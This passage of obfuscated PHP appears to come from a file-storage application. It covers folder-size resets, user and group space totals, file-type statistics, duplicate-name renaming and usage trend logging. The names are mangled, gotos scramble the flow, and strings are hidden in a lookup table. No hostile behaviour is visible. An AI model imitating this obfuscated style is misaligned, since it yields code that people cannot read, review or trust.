self::$cacheSourceInfo[$dÚÙÇøÃÑ]; goto Aó‹ÎµéŠ; C¡ö…ø²÷: $dÚÙÇøÃÑ = $eñØíòâº[410] . $F°™—Ö—æˆ; $FùªˆÇÄÆ = _get(self::$cacheSourceInfo, $dÚÙÇøÃÑ); if ($FùªˆÇÄÆ) { return $FùªˆÇÄÆ; } goto aÊ§½œ›Œº; fÍèóÍµÒŠ: $eñØíòâº =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$F°™—Ö—æˆ) { return array(); } $F°™—Ö—æˆ = intval($F°™—Ö—æˆ); goto C¡ö…ø²÷; Aó‹ÎµéŠ: } public function sourceCacheClear($DçÄ­±‘» = false) { if ($DçÄ­±‘» == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][410] . $DçÄ­±‘»]); } public function pathInfoByPath($dÉ°ê¶¥Ê‰, $C²­„–ñøÓ) { $FÇÕø„Ù¥… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a—â‡ ÷» = !$C²­„–ñøÓ ? array() : explode($FÇÕø„Ù¥…[8], trim($C²­„–ñøÓ, $FÇÕø„Ù¥…[8])); $DÜõµÇ¯ˆ‚ = $dÉ°ê¶¥Ê‰; foreach ($a—â‡ ÷» as $fÄ‘¢ù¯°Š) { $b¿Œ¡¨í° = array($FÇÕø„Ù¥…[463] => $DÜõµÇ¯ˆ‚, $FÇÕø„Ù¥…[28] => $fÄ‘¢ù¯°Š); $d©·¾«É×“ = $this->where($b¿Œ¡¨í°)->select(); if (!$d©·¾«É×“) { return !1; } $d©·¾«É×“ = array_sort_by($d©·¾«É×“, $FÇÕø„Ù¥…[397]); $DÜõµÇ¯ˆ‚ = $d©·¾«É×“[0][$FÇÕø„Ù¥…[369]]; } return $this->pathInfo($DÜõµÇ¯ˆ‚, !0); } protected function updateModifyTime($CÜëí©‚“) { goto BĞ“Œ²òˆÕ; A®Ç˜êªãÂ: foreach ($CÜëí©‚“ as $EÌç­Ôí…É => $dË´ÇÏ¡‰ ) { $CÜëí©‚“[$EÌç­Ôí…É] = intval($dË´ÇÏ¡‰ ); } $B™Ü¢¶•½ = array($D¨‡‰±[369] => array($D¨‡‰±[7], $CÜëí©‚“)); $F¤Æ¹¯Ë«ò = array($D¨‡‰±[526] => USER_ID, $D¨‡‰±[390] => time()); goto F‡èÀ‹²ïë; F‡èÀ‹²ïë: $this->where($B™Ü¢¶•½)->save($F¤Æ¹¯Ë«ò); goto fÙäøÒ•ø‹; BĞ“Œ²òˆÕ: $D¨‡‰± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CÜëí©‚“) { return; } if (!is_array($CÜëí©‚“)) { $CÜëí©‚“ = array($CÜëí©‚“); } goto A®Ç˜êªãÂ; fÙäøÒ•ø‹: } public function folderSizeReset($eŠ™ßÔÇ„™) { goto c£§º„Í—; D…®Ø½İŠ„: CacheLock::lock($CÏ‰ÅóØ¸£, 20); $this->sourceCacheClear($eŠ™ßÔÇ„™); $e½ÆŸ­¥”ë = $this->sourceInfo($eŠ™ßÔÇ„™); goto AÜÄÁ¤–ˆ¤; c£§º„Í—: $F¢¡°ÛÂ†‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->statusIgnoreResetSpace) { return; } $CÏ‰ÅóØ¸£ = $F¢¡°ÛÂ†‚[2387] . $eŠ™ßÔÇ„™; goto D…®Ø½İŠ„; aìÃŠÁ¥¯Œ: $d†ˆ‡ïöÍ› = $CªËõÉ‚²¾ - intval($e½ÆŸ­¥”ë[$F¢¡°ÛÂ†‚[77]]); if ($d†ˆ‡ïöÍ› == 0) { return CacheLock::unlock($CÏ‰ÅóØ¸£); } $this->where(array($F¢¡°ÛÂ†‚[383] => $eŠ™ßÔÇ„™))->setField($F¢¡°ÛÂ†‚[77], $CªËõÉ‚²¾); goto b°’ŸŸÖ ; b°’ŸŸÖ : $FŒÜœÖ­Â© = $this->parentLevelArray($e½ÆŸ­¥”ë[$F¢¡°ÛÂ†‚[461]]); if ($FŒÜœÖ­Â©) { $c²–¬¢óÓ = array($F¢¡°ÛÂ†‚[369] => array($F¢¡°ÛÂ†‚[384], $FŒÜœÖ­Â©)); if ($d†ˆ‡ïöÍ› < 0) { $c²–¬¢óÓ[$F¢¡°ÛÂ†‚[77]] = array($F¢¡°ÛÂ†‚[925], abs($d†ˆ‡ïöÍ›)); } $this->where($c²–¬¢óÓ)->setAdd($F¢¡°ÛÂ†‚[77], $d†ˆ‡ïöÍ›); } $this->targetSpaceUpdate($e½ÆŸ­¥”ë[$F¢¡°ÛÂ†‚[371]], $e½ÆŸ­¥”ë[$F¢¡°ÛÂ†‚[458]]); goto cœ°´ÀÒÇ«; AÜÄÁ¤–ˆ¤: $c²–¬¢óÓ = array($F¢¡°ÛÂ†‚[368] => $eŠ™ßÔÇ„™, $F¢¡°ÛÂ†‚[396] => 0); $CªËõÉ‚²¾ = $this->where($c²–¬¢óÓ)->sum($F¢¡°ÛÂ†‚[77]); $CªËõÉ‚²¾ = intval($CªËõÉ‚²¾); goto aìÃŠÁ¥¯Œ; cœ°´ÀÒÇ«: CacheLock::unlock($CÏ‰ÅóØ¸£); goto eÏ™Öæ¿Ã²; eÏ™Öæ¿Ã²: } public function folderSizeResetChildren($D¬™“±ºå) { goto fÅîâÑŠ½–; fÏÚ²¥ÀÜ: $BÇóË¤¸œ‹[] = $F„ßÕÎ˜ã; $BÇóË¤¸œ‹ = array_to_keyvalue($BÇóË¤¸œ‹, $E¾ò‰Û‚½…[369]); foreach ($BÇóË¤¸œ‹ as $bêÈÖßÄã => $Eòğ³ŒÅÌ) { $BÇóË¤¸œ‹[$bêÈÖßÄã][$E¾ò‰Û‚½…[2389]] = $BÇóË¤¸œ‹[$bêÈÖßÄã][$E¾ò‰Û‚½…[77]]; $BÇóË¤¸œ‹[$bêÈÖßÄã][$E¾ò‰Û‚½…[77]] = 0; } goto bÂœ½—Ÿ¿Ù; bÂœ½—Ÿ¿Ù: foreach ($c¾¼æÚù×é as $Eòğ³ŒÅÌ) { $Båâ¼›×Úè = $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[463]] . $E¾ò‰Û‚½…[33]; if (!isset($BÇóË¤¸œ‹[$Båâ¼›×Úè])) { continue; } if ($Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[397]] == $BÇóË¤¸œ‹[$Båâ¼›×Úè][$E¾ò‰Û‚½…[397]]) { $BÇóË¤¸œ‹[$Båâ¼›×Úè][$E¾ò‰Û‚½…[77]] += $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[77]]; } } foreach ($BÇóË¤¸œ‹ as $Eòğ³ŒÅÌ) { $f«¥Ó§İ = $this->parentLevelArray($Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[461]]); foreach ($f«¥Ó§İ as $Båâ¼›×Úè) { $Båâ¼›×Úè = $Båâ¼›×Úè . $E¾ò‰Û‚½…[33]; if (!isset($BÇóË¤¸œ‹[$Båâ¼›×Úè])) { continue; } if ($Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[397]] == $BÇóË¤¸œ‹[$Båâ¼›×Úè][$E¾ò‰Û‚½…[397]]) { $BÇóË¤¸œ‹[$Båâ¼›×Úè][$E¾ò‰Û‚½…[77]] += $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[77]]; } } } $E‰òóÕ®ê¼ = array(); goto B“ÓœŞ˜ãá; fÅîâÑŠ½–: $E¾ò‰Û‚½… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->sourceCacheClear($D¬™“±ºå); $F„ßÕÎ˜ã = $this->sourceInfo($D¬™“±ºå); goto aÉŠ¹¨§«¸; aÉŠ¹¨§«¸: $FÒñõ¾õ = array($E¾ò‰Û‚½…[520] => 1, $E¾ò‰Û‚½…[527] => array($E¾ò‰Û‚½…[485], $F„ßÕÎ˜ã[$E¾ò‰Û‚½…[461]] . $D¬™“±ºå . $E¾ò‰Û‚½…[486])); $CŸØÉ†ø˜ = $E¾ò‰Û‚½…[2388]; $BÇóË¤¸œ‹ = $this->field($CŸØÉ†ø˜)->where($FÒñõ¾õ)->select(); goto DÎÃ¡’˜‹Ä; DÎÃ¡’˜‹Ä: $FÒñõ¾õ[$E¾ò‰Û‚½…[370]] = 0; $c¾¼æÚù×é = $this->field($CŸØÉ†ø˜)->where($FÒñõ¾õ)->select(); if (!$c¾¼æÚù×é) { return; } goto fÏÚ²¥ÀÜ; B“ÓœŞ˜ãá: foreach ($BÇóË¤¸œ‹ as $Eòğ³ŒÅÌ) { if ($Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[77]] == $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[2389]]) { continue; } $E‰òóÕ®ê¼[] = array($E¾ò‰Û‚½…[369], $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[369]], $E¾ò‰Û‚½…[77], $Eòğ³ŒÅÌ[$E¾ò‰Û‚½…[77]]); } $this->saveAll($E‰òóÕ®ê¼); goto CÁ³§‡Õ–ß; CÁ³§‡Õ–ß: } public function userSpaceReset($cšÆƒé¢ß¨ = false) { $aÀ¥õ‘£³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D·½†ëóö = $this->where(array($aÀ¥õ‘£³[371] => self::TYPE_USER, $aÀ¥õ‘£³[458] => $cšÆƒé¢ß¨, $aÀ¥õ‘£³[370] => 0))->sum($aÀ¥õ‘£³[77]); Model($aÀ¥õ‘£³[476])->userEdit($cšÆƒé¢ß¨, array($aÀ¥õ‘£³[2094] => $D·½†ëóö)); } public function targetSpaceUpdate($AøÛ‡ëÚ©¨, $AÎ­ÌŒ‹£) { $a†ĞÔØôåŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$AÎ­ÌŒ‹£) { return; } if (!in_array($AøÛ‡ëÚ©¨, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $e¢ÀÉĞó”‰ = $this->targetSpaceSize($AøÛ‡ëÚ©¨, $AÎ­ÌŒ‹£); if ($AøÛ‡ëÚ©¨ == self::TYPE_USER) { Model($a†ĞÔØôåŠ[476])->userEdit($AÎ­ÌŒ‹£, array($a†ĞÔØôåŠ[2094] => $e¢ÀÉĞó”‰)); } else { if ($AøÛ‡ëÚ©¨ == self::TYPE_GROUP) { Model($a†ĞÔØôåŠ[460])->groupEdit($AÎ­ÌŒ‹£, array($a†ĞÔØôåŠ[2094] => $e¢ÀÉĞó”‰)); } } } public function targetSpaceSize($DÑÎ’Šã…, $C™Ó—ªê³Æ) { goto a¦ŒÃŠÒß; Dè†Ãã”‡‚: $dñ³áî£Áœ = floatval($Fö‰™øÎ„®[$eµˆ‘Ó»ÏÙ[77]]); $aïÔ‰‹½½ç = array($eµˆ‘Ó»ÏÙ[527] => array($eµˆ‘Ó»ÏÙ[485], $eµˆ‘Ó»ÏÙ[472] . $Fö‰™øÎ„®[$eµˆ‘Ó»ÏÙ[369]] . $eµˆ‘Ó»ÏÙ[486])); $e°—¤¯¨Óö = Model($eµˆ‘Ó»ÏÙ[395])->field($eµˆ‘Ó»ÏÙ[383])->where($aïÔ‰‹½½ç)->select(); goto Dƒ°¬µ¸ÎÁ; a¦ŒÃŠÒß: $eµˆ‘Ó»ÏÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fö‰™øÎ„® = $this->sourceRoot($DÑÎ’Šã…, $C™Ó—ªê³Æ, !0); if (!$Fö‰™øÎ„®) { return 0; } goto Dè†Ãã”‡‚; Dƒ°¬µ¸ÎÁ: $e°—¤¯¨Óö = array_to_keyvalue($e°—¤¯¨Óö, $eµˆ‘Ó»ÏÙ[33], $eµˆ‘Ó»ÏÙ[369]); $e°—¤¯¨Óö = array_unique(array_filter($e°—¤¯¨Óö)); if ($e°—¤¯¨Óö) { $aïÔ‰‹½½ç = array($eµˆ‘Ó»ÏÙ[383] => array($eµˆ‘Ó»ÏÙ[384], $e°—¤¯¨Óö)); $dñ³áî£Áœ += floatval($this->where($aïÔ‰‹½½ç)->sum($eµˆ‘Ó»ÏÙ[77])); } goto FŸ‚°¸á¦; FŸ‚°¸á¦: return $dñ³áî£Áœ; goto a´ß¾ëìÃ; a´ß¾ëìÃ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($E´ö¡Î¼ƒï) { return $this->fileTypeProfile($E´ö¡Î¼ƒï, SourceModel::TYPE_USER); } public function groupFileTypeProfile($bÓÕĞ‚Ñò®) { return $this->fileTypeProfile($bÓÕĞ‚Ñò®, SourceModel::TYPE_GROUP); } private function fileTypeProfile($EÆô¤ƒÔà, $F„Â…İçî) { goto fÄÎÓ¥£äõ; Fˆœ˜Ê­â: if ($bºØ ˆƒÎ­) { return $bºØ ˆƒÎ­; } $fÇ•Ä»Ğ—É = array($cÓÎò¾˜±[520] => 0); if ($EÆô¤ƒÔà != !1) { $fÇ•Ä»Ğ—É[$cÓÎò¾˜±[458]] = $EÆô¤ƒÔà; $fÇ•Ä»Ğ—É[$cÓÎò¾˜±[371]] = $F„Â…İçî; } goto AáŒ¹Ñ¢İ; AáŒ¹Ñ¢İ: $cÙÛ¤¿‰È½ = array(); $cÙÛ¤¿‰È½[$cÓÎò¾˜±[2391]] = array($cÓÎò¾˜±[2392] => LNG($cÓÎò¾˜±[2391]), $cÓÎò¾˜±[2393] => $this->where($fÇ•Ä»Ğ—É)->count(), $cÓÎò¾˜±[522] => $this->where($fÇ•Ä»Ğ—É)->sum($cÓÎò¾˜±[77])); $E‘‘ÛĞÕ¶Š = KodIO::fileTypeList(); goto E¬×ÄöÉ´¶; E¬×ÄöÉ´¶: foreach ($E‘‘ÛĞÕ¶Š as $C ŸØŸ®´¸ => $DŞÊ¸èİà‡) { $fÇ•Ä»Ğ—É[$cÓÎò¾˜±[372]] = $this->fileTypeWhere($C ŸØŸ®´¸); $cÙÛ¤¿‰È½[$C ŸØŸ®´¸] = array($cÓÎò¾˜±[2392] => $DŞÊ¸èİà‡[$cÓÎò¾˜±[28]], $cÓÎò¾˜±[2393] => $this->where($fÇ•Ä»Ğ—É)->count(), $cÓÎò¾˜±[522] => $this->where($fÇ•Ä»Ğ—É)->sum($cÓÎò¾˜±[77])); } Cache::set($BÇ÷Ë¾ŒÁÔ, $cÙÛ¤¿‰È½, 1200); return $cÙÛ¤¿‰È½; goto eé«Š­£ï‘; fÄÎÓ¥£äõ: $cÓÎò¾˜± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÇ÷Ë¾ŒÁÔ = $cÓÎò¾˜±[2390] . $EÆô¤ƒÔà . $cÓÎò¾˜±[70] . $F„Â…İçî; $bºØ ˆƒÎ­ = Cache::get($BÇ÷Ë¾ŒÁÔ); goto Fˆœ˜Ê­â; eé«Š­£ï‘: } public function fileNameExist($CƒŞ¯ß‡Ÿ†, $EÅê¢©‚ñÖ) { $DÒâñ¶àá‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fŒ¶™ã¤øÔ = $this->childList($CƒŞ¯ß‡Ÿ†); foreach ($fŒ¶™ã¤øÔ as $fÑ§á’ˆÆì) { if ($fÑ§á’ˆÆì[$DÒâñ¶àá‹[28]] == $EÅê¢©‚ñÖ) { return $fÑ§á’ˆÆì[$DÒâñ¶àá‹[369]]; } if (strtolower($fÑ§á’ˆÆì[$DÒâñ¶àá‹[28]]) == strtolower($EÅê¢©‚ñÖ)) { return $fÑ§á’ˆÆì[$DÒâñ¶àá‹[369]]; } } return !1; } public function childList($bÍ¬²¿§é¸) { goto bß´Ì¨ïƒá; b‰ŞÀª¶šĞ: $c‰çœˆŒ˜â = array($c Æó„©î§[463] => intval($bÍ¬²¿§é¸), $c Æó„©î§[397] => 0); $A„ÙŸïŸ‘Ä = $this->where($c‰çœˆŒ˜â)->select(); $A„ÙŸïŸ‘Ä = $A„ÙŸïŸ‘Ä ? $A„ÙŸïŸ‘Ä : array(); goto cé·Ñ‹«Â¿; bß´Ì¨ïƒá: $c Æó„©î§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÆ®åÖİò = $c Æó„©î§[2372] . $bÍ¬²¿§é¸; if (isset(self::$cacheChildList[$dÆ®åÖİò])) { return self::$cacheChildList[$dÆ®åÖİò]; } goto b‰ŞÀª¶šĞ; cé·Ñ‹«Â¿: self::$cacheChildList[$dÆ®åÖİò] = $A„ÙŸïŸ‘Ä; foreach ($A„ÙŸïŸ‘Ä as $DõÏÛ”ë‰) { $dÆ®åÖİò = $c Æó„©î§[410] . $DõÏÛ”ë‰[$c Æó„©î§[369]]; self::$cacheSourceInfo[$dÆ®åÖİò] = $DõÏÛ”ë‰; } return $A„ÙŸïŸ‘Ä; goto D‹¸í…×Õ½; D‹¸í…×Õ½: } public function fileNameAuto($b»«Ô³ƒˆ, $a¤ç¸Ò¿ŞŠ, $a®‹‡†Íˆ = REPEAT_RENAME, $b¯÷¤àĞ˜à = false) { $d­´®ÉÊ¾ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d×ÓÛ°º§ = $this->childList($b»«Ô³ƒˆ); $C²ÜÎÊàğÔ = array_to_keyvalue($d×ÓÛ°º§, $d­´®ÉÊ¾ã[33], $d­´®ÉÊ¾ã[28]); return $this->fileNameAutoGet($C²ÜÎÊàğÔ, $a¤ç¸Ò¿ŞŠ, $a®‹‡†Íˆ, $b¯÷¤àĞ˜à); } public function fileNameAutoGet($Båøîöù¨, $DÎá·ÒÚ, $Dòù”‘‰•, $A³íÂù¾Ï‚) { $dÊä±óæ‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($Dòù”‘‰• == REPEAT_REPLACE || !$Båøîöù¨ || !in_array_not_case($DÎá·ÒÚ, $Båøîöù¨) || $A³íÂù¾Ï‚ && $Dòù”‘‰• != REPEAT_RENAME_FOLDER) { return $DÎá·ÒÚ; } if ($Dòù”‘‰• == REPEAT_SKIP) { return !1; } $fØß¹«Ÿ“Ä = $dÊä±óæ‚[91] . get_path_ext($DÎá·ÒÚ); $fØß¹«Ÿ“Ä = $fØß¹«Ÿ“Ä == $dÊä±óæ‚[91] || $A³íÂù¾Ï‚ ? $dÊä±óæ‚[33] : $fØß¹«Ÿ“Ä; for ($EË¨›¾Àƒ„ = 1; $EË¨›¾Àƒ„ <= count($Båøîöù¨) + 1; $EË¨›¾Àƒ„++) { $F½…Ùİ«Š» = substr($DÎá·ÒÚ, 0, strlen($DÎá·ÒÚ) - strlen($fØß¹«Ÿ“Ä)); $Añ¦µø¬ñ… = $F½…Ùİ«Š» . "\x28{$EË¨›¾Àƒ„}\x29{$fØß¹«Ÿ“Ä}"; if (!in_array_not_case($Añ¦µø¬ñ…, $Båøîöù¨)) { return $Añ¦µø¬ñ…; } } } } $c‹ìºÁ‚« = LIB_DIR . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1122]; $e°¿êŞëİ• = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1123]; goto FŸÓ‰ÊËíï; eÁ…Ò‰ÊÀğ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($CáÎ–Ş¿İ¥) { $C¤ïÇ•‹­ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c…‡èÛíË¶ = array($C¤ïÇ•‹­ê[537] => array($C¤ïÇ•‹­ê[29] => $C¤ïÇ•‹­ê[2033], $C¤ïÇ•‹­ê[261] => array($C¤ïÇ•‹­ê[210], $C¤ïÇ•‹­ê[694], $C¤ïÇ•‹­ê[2034], $C¤ïÇ•‹­ê[2035])), $C¤ïÇ•‹­ê[2036] => array($C¤ïÇ•‹­ê[29] => $C¤ïÇ•‹­ê[2037], $C¤ïÇ•‹­ê[261] => array($C¤ïÇ•‹­ê[210], $C¤ïÇ•‹­ê[692], $C¤ïÇ•‹­ê[2038], $C¤ïÇ•‹­ê[2039], $C¤ïÇ•‹­ê[2040]))); if (!isset($c…‡èÛíË¶[$CáÎ–Ş¿İ¥])) { return !1; } $this->optionType = $c…‡èÛíË¶[$CáÎ–Ş¿İ¥][$C¤ïÇ•‹­ê[29]]; $this->field = $c…‡èÛíË¶[$CáÎ–Ş¿İ¥][$C¤ïÇ•‹­ê[261]]; return !0; } public function listData($FÓ§«¿Ô· = false, $fß÷‚„ä” = "\155\157\x64\x69\x66\x79\124\151\155\145", $fâ—áãóË· = false) { return parent::listData($FÓ§«¿Ô·, $fß÷‚„ä”, $fâ—áãóË·); } public function trendList($E†¡›©ç‡â) { goto FĞğŸº—ø°; FĞğŸº—ø°: $Fß÷‹„ö® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¹„™ë‚ = $this->listData(); if ($a¹„™ë‚) { $fğØÏ“•µå = end($a¹„™ë‚); $CßÑ¯äí¤£ = date($Fß÷‹„ö®[2041], strtotime($Fß÷‹„ö®[2042])); if ($fğØÏ“•µå[$Fß÷‹„ö®[210]] == $CßÑ¯äí¤£) { return $a¹„™ë‚; } $FÇ¨âòÉ¸ß = strtotime($fğØÏ“•µå[$Fß÷‹„ö®[210]]); } goto DÜß²ìñ—…; Bğ¦‡¾Áã¨: foreach ($Fê¼…²¿íË as $CßÑ¯äí¤£) { $this->{$cßÄ‘Üºâ}($CßÑ¯äí¤£); } return $this->listData(); goto CÛÖõá²õ¿; DÜß²ìñ—…: if (!isset($FÇ¨âòÉ¸ß)) { $aíœØÒ’é = $E†¡›©ç‡â == $Fß÷‹„ö®[537] ? $Fß÷‹„ö®[479] : $Fß÷‹„ö®[754]; $FÇ¨âòÉ¸ß = Model($aíœØÒ’é)->min($Fß÷‹„ö®[187]); } $cßÄ‘Üºâ = $Fß÷‹„ö®[2043] . ucfirst($E†¡›©ç‡â); $Fê¼…²¿íË = $this->dateList($FÇ¨âòÉ¸ß); goto Bğ¦‡¾Áã¨; CÛÖõá²õ¿: } private function dateList($eó©“‚›ò) { $CÚóÂßĞ¡» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c˜‘Ä‰„Á = $eó©“‚›ò; $AÁİƒŠ°Ä‡ = strtotime($CÚóÂßĞ¡»[2042]); $AÁÉäàİ“• = array(); while ($c˜‘Ä‰„Á <= $AÁİƒŠ°Ä‡) { $AÁÉäàİ“•[] = date($CÚóÂßĞ¡»[2041], $c˜‘Ä‰„Á); $c˜‘Ä‰„Á = strtotime($CÚóÂßĞ¡»[2044], $c˜‘Ä‰„Á); } return $AÁÉäàİ“•; } public function _recordUser($cÔ¬ÅòÌ¦ = '') { goto fâ¦¿Ğ±Ü; dÆ’„£à¢¬: $aÅéÏàÊ°Ó = array($B¿á…Í—º¡[210] => $cÔ¬ÅòÌ¦, $B¿á…Í—º¡[694] => (int) $Cê†ŞŒì…, $B¿á…Í—º¡[2034] => (int) $E…Ü¶—î„‘, $B¿á…Í—º¡[2035] => (int) $bíó³ÄãÕ); return $this->insert($aÅéÏàÊ°Ó); goto Aé³­Üó; fâ¦¿Ğ±Ü: $B¿á…Í—º¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dî¥°Æ‰‡ƒ = strtotime(date($B¿á…Í—º¡[2045], strtotime($cÔ¬ÅòÌ¦))); $e¸×ê™ò†ğ = strtotime(date($B¿á…Í—º¡[2046], strtotime($cÔ¬ÅòÌ¦))); goto d¶’à¥²; AæÑ»‘Œ‚: $E…Ü¶—î„‘ = Model($B¿á…Í—º¡[479])->where($AˆÖùù¸æõ)->count($B¿á…Í—º¡[1437]); $AˆÖùù¸æõ[$B¿á…Í—º¡[29]] = $B¿á…Í—º¡[2047]; $bíó³ÄãÕ = Model($B¿á…Í—º¡[2048])->where($AˆÖùù¸æõ)->count($B¿á…Í—º¡[2049]); goto dÆ’„£à¢¬; d¶’à¥²: $AˆÖùù¸æõ = array($B¿á…Í—º¡[187] => array($B¿á…Í—º¡[923], $e¸×ê™ò†ğ)); $Cê†ŞŒì… = Model($B¿á…Í—º¡[479])->where($AˆÖùù¸æõ)->count($B¿á…Í—º¡[1437]); $AˆÖùù¸æõ[$B¿á…Í—º¡[187]] = array($B¿á…Í—º¡[321], array($Dî¥°Æ‰‡ƒ, $e¸×ê™ò†ğ)); goto AæÑ»‘Œ‚; Aé³­Üó: } public function _recordStore($cİÄ¡½Ğë = '') { goto dìÌæÉÔ‡; eƒ³ö§’ö: $dÄÇ‡ë Ğ = Model($fí§Ó×¸«´[754])->where($b£ºŒÕµğ)->sum($fí§Ó×¸«´[77]); $e‹ÜÆÊ“ç = array($fí§Ó×¸«´[210] => $cİÄ¡½Ğë, $fí§Ó×¸«´[692] => (int) $D£ïğ Åº, $fí§Ó×¸«´[2038] => (int) $DõÃÛ×ŒÀã, $fí§Ó×¸«´[2039] => (int) $dÔòÃ×ïù­, $fí§Ó×¸«´[2040] => (int) $dÄÇ‡ë Ğ); return $this->insert($e‹ÜÆÊ“ç); goto cÌˆïÛ†Û ; bß³ ¡Ú: $b£ºŒÕµğ[$fí§Ó×¸«´[371]] = 1; $dÔòÃ×ïù­ = Model($fí§Ó×¸«´[754])->where($b£ºŒÕµğ)->sum($fí§Ó×¸«´[77]); $b£ºŒÕµğ[$fí§Ó×¸«´[371]] = 2; goto eƒ³ö§’ö; aİêÊù²‰¯: $DõÃÛ×ŒÀã = Model($fí§Ó×¸«´[422])->where($b£ºŒÕµğ)->sum($fí§Ó×¸«´[77]); $b£ºŒÕµğ[$fí§Ó×¸«´[370]] = 0; $D£ïğ Åº = Model($fí§Ó×¸«´[754])->where($b£ºŒÕµğ)->sum($fí§Ó×¸«´[77]); goto bß³ ¡Ú; dìÌæÉÔ‡: $fí§Ó×¸«´ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E‚éµøĞØ‘ = strtotime(date($fí§Ó×¸«´[2046], strtotime($cİÄ¡½Ğë))); $b£ºŒÕµğ = array($fí§Ó×¸«´[187] => array($fí§Ó×¸«´[923], $E‚éµøĞØ‘)); goto aİêÊù²‰¯; cÌˆïÛ†Û : } public function trend($b•ğ”éÄõ¿, $a‹ª¿›¹Âß) { goto eöË‘óŸ·†; fµªøÈĞ½Ï: if ($dĞŒÜö»ğ¢ && $a‹ª¿›¹Âß != $F£Œ­°Æ[1412]) { $FÉªÂšöª = $dĞŒÜö»ğ¢[0][$F£Œ­°Æ[210]]; $Cº…³•†áŠ = $this->validDate($a‹ª¿›¹Âß, $FÉªÂšöª); $a‘ìÂøğ‚ = array(); $FŞ°ã¦ÛÃ› = array_to_keyvalue($dĞŒÜö»ğ¢, $F£Œ­°Æ[210]); foreach ($Cº…³•†áŠ as $bñŸàšÜ‰„) { if (isset($FŞ°ã¦ÛÃ›[$bñŸàšÜ‰„])) { $Aî¦˜íÊ³¯ = $FŞ°ã¦ÛÃ›[$bñŸàšÜ‰„]; } else { $Aî¦˜íÊ³¯ = end($dĞŒÜö»ğ¢); $Aî¦˜íÊ³¯[$F£Œ­°Æ[210]] = $bñŸàšÜ‰„; if ($b•ğ”éÄõ¿ == $F£Œ­°Æ[537]) { $Aî¦˜íÊ³¯[$F£Œ­°Æ[2034]] = $Aî¦˜íÊ³¯[$F£Œ­°Æ[2035]] = 0; } } $a‘ìÂøğ‚[] = $Aî¦˜íÊ³¯; } $dĞŒÜö»ğ¢ = $a‘ìÂøğ‚; } $E©Ş‹Æ´İ = array($F£Œ­°Æ[537] => array($F£Œ­°Æ[694] => LNG($F£Œ­°Æ[2050]), $F£Œ­°Æ[2034] => LNG($F£Œ­°Æ[2051]), $F£Œ­°Æ[2035] => LNG($F£Œ­°Æ[2052])), $F£Œ­°Æ[2036] => array($F£Œ­°Æ[692] => LNG($F£Œ­°Æ[2053]), $F£Œ­°Æ[2038] => LNG($F£Œ­°Æ[2054]), $F£Œ­°Æ[2039] => LNG($F£Œ­°Æ[2055]), $F£Œ­°Æ[2040] => LNG($F£Œ­°Æ[2056]))); $DĞ‰•ÇÕ™ = array($F£Œ­°Æ[537] => $F£Œ­°Æ[2057], $F£Œ­°Æ[2036] => $F£Œ­°Æ[77]); goto C§œ‚Ø ¯õ; C§œ‚Ø ¯õ: if (empty($dĞŒÜö»ğ¢)) { $bñŸàšÜ‰„ = date($F£Œ­°Æ[2041], strtotime($F£Œ­°Æ[2042])); $D¢á÷ÍÒ¬¨ = array($F£Œ­°Æ[210] => $bñŸàšÜ‰„); foreach ($E©Ş‹Æ´İ[$b•ğ”éÄõ¿] as $B¤„•Œ«ÒÀ => $B×‹­ç…Ñ) { $D¢á÷ÍÒ¬¨[$B¤„•Œ«ÒÀ] = 0; } $dĞŒÜö»ğ¢[] = $D¢á÷ÍÒ¬¨; } $DÆù‘à²Ğ² = array(); foreach ($dĞŒÜö»ğ¢ as $B×‹­ç…Ñ) { if ($b•ğ”éÄõ¿ == $F£Œ­°Æ[2036] && $B×‹­ç…Ñ[$F£Œ­°Æ[2038]] > $B×‹­ç…Ñ[$F£Œ­°Æ[692]]) { $B×‹­ç…Ñ[$F£Œ­°Æ[2038]] = $B×‹­ç…Ñ[$F£Œ­°Æ[692]]; } foreach ($E©Ş‹Æ´İ[$b•ğ”éÄõ¿] as $B¤„•Œ«ÒÀ => $EÓæŒ‘ğ¸À) { $Aî¦˜íÊ³¯ = array($F£Œ­°Æ[210] => $B×‹­ç…Ñ[$F£Œ­°Æ[210]], $F£Œ­°Æ[1343] => $EÓæŒ‘ğ¸À); $Aî¦˜íÊ³¯[$DĞ‰•ÇÕ™[$b•ğ”éÄõ¿]] = isset($B×‹­ç…Ñ[$B¤„•Œ«ÒÀ]) ? $B×‹­ç…Ñ[$B¤„•Œ«ÒÀ] : 0; 